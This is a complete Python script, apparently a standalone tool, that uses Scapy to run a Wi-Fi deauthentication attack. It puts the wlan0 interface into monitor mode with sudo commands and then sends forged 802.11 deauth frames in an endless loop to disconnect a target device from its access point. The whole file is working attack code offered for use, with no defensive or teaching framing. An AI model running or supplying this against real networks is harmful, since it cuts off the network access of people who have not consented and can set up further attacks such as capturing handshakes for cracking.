from scapy.all import *
import time
import os
import sys

def send_deauth(target_mac, gateway_mac, iface="wlan0"):
    """Sends continuous deauth packets to forcefully disconnect clients."""
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
    while True:
        sendp(packet, iface=iface, count=100, inter=0.1, verbose=True)
        time.sleep(2)  # Keep sending packets

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 deauth.py <BSSID> <Gateway MAC>")
        sys.exit(1)

    target_mac = sys.argv[1]
    gateway_mac = sys.argv[2]

    print(f"[*] Starting Deauth Attack on {target_mac}...")
    os.system("sudo ifconfig wlan0 down")
    os.system("sudo iwconfig wlan0 mode monitor")
    os.system("sudo ifconfig wlan0 up")

    send_deauth(target_mac, gateway_mac)
